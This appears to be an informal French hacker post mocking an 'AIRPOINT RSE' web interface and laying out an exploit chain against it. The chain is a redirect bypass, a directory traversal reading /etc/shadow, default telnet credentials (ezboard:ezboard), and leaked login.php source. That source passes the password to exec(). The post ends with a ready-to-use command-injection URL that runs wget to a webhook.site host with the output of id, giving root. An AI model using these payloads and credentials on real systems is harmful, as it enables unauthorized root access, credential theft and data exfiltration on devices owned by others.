html:"AIRPOINT RSE"

encore une clownerie

302 bypass sur /Log.php qui permet de découvrir /download.php?file_down qui lui meme est vuln a des attaques de directory traversal.

Ah oui et le serv web tourne en root donc..

/download.php?file_down=../../../../../../etc/shadow  :)

ensuite on trouve les noms des user : ezboard et bien sur user as pass sur le telnet.. (ezboard:ezboard)

MAIS YA MIEU
```
---------------------------- login.php ----------------------------
<? require "cfg_cmd.php"; ?>

<?
    session_start();
    if( isset($HTTP_SESSION_VARS['login_name']) == false )
    {
        session_register("login_name");
    }
    $user_id = exec($cfg_read . "user_id");
    if( ($HTTP_SESSION_VARS['login_name'] != $user_id) )
    {
        if( isset($_GET['login_id']) )
        {
            $user_pw = exec($cfg_read . "user_pw");
            $input_id = $_GET['user_id'];
            $input_pw = $_GET['user_pw'];
            $input_pw = exec($cfg_aes_enc . $input_pw);
            if( ($user_id == $input_id) && ($user_pw == $input_pw) )
            {
                $HTTP_SESSION_VARS['login_name'] = $user_id;
                echo "OK";
            }
            else
            {
                echo "AUTH_FAIL";
            }
        }
        else
        {
            echo "FAIL";
        }
    }
    else
    {
        echo "OK";
    }
?>
```
------------------------------------------------------------------------------------

CA LA, CA, C'EST LE CODE DE LA PAGE DE LOGIN.. 

du coup bon ben /login.php?login_id=123&user_id=123&user_pw=$(wget%20http://webhook.site/xx/$(id))

voila on est root..


:clown_face::clown_face::clown_face::clown_face::clown_face::clown_face::clown_face: pouet pouet
